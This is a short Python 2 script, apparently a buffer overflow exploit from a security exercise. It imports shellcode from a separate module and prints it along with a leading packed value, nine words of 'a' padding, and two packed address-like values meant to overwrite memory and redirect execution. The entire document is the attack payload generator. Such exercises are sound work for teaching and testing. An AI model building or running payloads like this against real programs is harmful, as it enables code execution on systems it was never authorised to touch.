from shellcode import shellcode
from struct import pack

print pack("<I", 0x40000000) +  shellcode + pack("<I", 0x61616161) * 9 + pack("<I", 0xfe705061) + pack("<I", 0x616161bf)
